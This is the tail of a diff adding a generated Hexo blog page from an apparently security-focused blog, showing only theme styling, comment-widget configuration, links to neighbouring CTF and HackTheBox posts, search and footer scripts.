+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'BwVA2Xrm8Nb2jkt7vzHraj5v-gzGzoHsz',
+        appKey: 'fU1ygroQcwd8phJAJRiJx0lL',
+        notify: 'false' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'retro',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '昵称、邮箱、网址非必填项，可直接匿名评论。',
+        enableQQ: false, //昵称输入qq号自动识别
+        emojiCDN: '//i0.hdslb.com/bfs/emote/', 
+        // 表情title和图片映射
+        emojiMaps: {
+        "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
+        "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
+        "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
+        "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
+        "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
+        "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
+        "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
+        "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
+        "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
+        "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
+        "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
+        "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
+        "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
+        "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
+        "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
+        "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
+        "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
+        "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
+        "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
+        "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
+        "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
+        "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
+        "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
+        "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
+        "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
+        "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
+        "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
+        "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
+        "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
+        "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
+        "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
+        "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
+        "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
+        "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
+        "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
+        "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
+        "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
+        "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
+        "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
+        "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
+        "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
+        "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
+        "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
+        "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
+        "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
+        "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
+        "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
+        "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
+        "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
+        "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"
+            // ... 更多表情
+        }
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+<!-- 直达评论 -->
+<div id="to_comment" class="comment-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#vcomments" title="直达评论">
+        <i class="fas fa-comments"></i>
+    </a>
+</div>
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/posts/48d4210.html">
+                    <div class="card-image">
+                        
+                        <img src="/medias/article_cover/CTF.gif" class="responsive-img" alt="蓝帽杯2021-OnePointerPHP">
+                        
+                        <span class="card-title">蓝帽杯2021-OnePointerPHP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            蓝帽杯2021-OnePointerPHP
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/e48c1386.html">
+                    <div class="card-image">
+                        
+                        <img src="/medias/article_cover/Wifinetic.png" class="responsive-img" alt="HTB-Wifinetic">
+                        
+                        <span class="card-title">HTB-Wifinetic</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            HackTheBox-Wifinetic
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/HackTheBox/">
+                        <span class="chip bg-color">HackTheBox</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('1')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: wa0er<br />'
+            + '文章作者: wa0er<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '引用或转载文章内容时，注明源文章链接就好，谢谢您。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <a href="/about" target="_blank">wa0er</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+
+            <br>
+            
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点文章总字数:&nbsp;<span
+                        class="white-color">54.2k&nbsp;字</span>
+            
+            
+
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/wa0er" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:heyzky@foxmail.com" class="tooltipped" target="_blank" data-tooltip="我的邮箱" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
